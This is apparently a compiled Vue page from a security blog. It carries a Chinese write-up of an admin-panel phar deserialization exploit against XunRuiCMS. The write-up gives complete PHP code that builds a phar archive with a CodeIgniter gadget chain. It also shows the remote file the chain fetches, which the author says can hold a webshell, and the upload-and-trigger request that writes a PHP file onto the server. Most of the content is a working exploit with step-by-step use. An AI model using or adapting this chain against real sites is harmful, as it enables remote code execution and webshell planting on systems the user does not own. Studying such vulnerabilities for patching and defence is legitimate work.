import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as e,e as s}from"./app-c3b48019.js";const d="/assets/Pasted-image-20240804230432-249c76aa.png",l="/assets/Pasted-image-20240804231218-2e055f98.png",a="/assets/Pasted-image-20240804231519-5586521b.png",v="/assets/123-41e190d0.png",r={},c=s(`<p>tips:如果是本地小皮搭建，需要使用apache为中间件，且php.ini的phar.readonly需要为Off</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[Phar]
; http://php.net/phar.readonly
phar.readonly = Off

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>前提条件是需要登录后台，</p><p>首先自己本地使用下方代码生成<code>phar.phar</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php

namespace {

    ini_set(&#39;display_errors&#39;, 1);

    ini_set(&#39;display_startup_errors&#39;, 1);

    error_reporting(E_ALL);

}

namespace CodeIgniter\\Cache\\Handlers {

    use CodeIgniter\\Session\\Handlers\\MemcachedHandler;


    class RedisHandler {

        protected $redis;

        public function __construct() {

            // 实例化不同命名空间中的 RedisHandler 类

            $this-&gt;redis = new MemcachedHandler();

        }

    }

}

namespace CodeIgniter\\Session\\Handlers{

    use CodeIgniter\\HTTP\\CURLRequest;

    class MemcachedHandler {

        public $memcached;

        public $lockKey;

        public function __construct()

        {

            $this-&gt;lockKey=&#39;http://127.0.0.1/88.php&#39;; //远程服务器所需要准备的文件

            $this-&gt;memcached = new CURLRequest();

        }

    }

}

namespace CodeIgniter\\HTTP{

    class CURLRequest
    {
        protected $config = [];
        public function __construct()
        {

           $this-&gt;config = [

            // &#39;timeout&#39;         =&gt; 1.0,

            // &#39;connect_timeout&#39; =&gt; 150,

            &#39;debug&#39;           =&gt; &quot;../../../WWW/XunRuiCMS-Study/666.php&quot;, //所生成马的文件，建议绝对路径，这样会生成在php.exe的目录

            &#39;verify&#39;          =&gt; true,

        ];
        }
    }

}

// 全局命名空间

namespace {

    use CodeIgniter\\Cache\\Handlers\\RedisHandler;

    $phar = new Phar(&quot;phar.phar&quot;);

    $phar-&gt;startBuffering();

    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub

    $o = new RedisHandler();

    $o -&gt; data=&#39;hu3sky&#39;;

    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest

    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);

    //签名自动计算

    $phar-&gt;stopBuffering();

  
  

//    $o = new RedisHandler();

//    print_r(urlencode(serialize($o)));

}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>88.php</code>代码为(可放马)</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php

header(&quot;Content-Type: application/json &lt;?php phpinfo();?&gt;&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后找到文章的附件上传处 <img src="`+d+'" alt="Pastedimage20240804230432.png">]</p><p>上传<code>phar.phar</code>改后缀为<code>.zip</code> 可以在这边查看路径，文件名称 <img src="'+l+`" alt="Pastedimage20240804231218.png">]</p><p>然后在另开一个页面</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://xunruicms-study:8009/admin.php?c=api&amp;m=test_avatar_domain

image[avatar_path]=phar://./uploadfile/202408/37738d115ba9223.zip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+a+'" alt="Pastedimage20240804231519.png">] 即可在指定目录生成文件</p><p><img src="'+v+'" alt="123.png"></p>',13),u=[c];function t(m,b){return i(),e("div",null,u)}const g=n(r,[["render",t],["__file","讯睿cms后台反序列化漏洞.html.vue"]]);export{g as default};
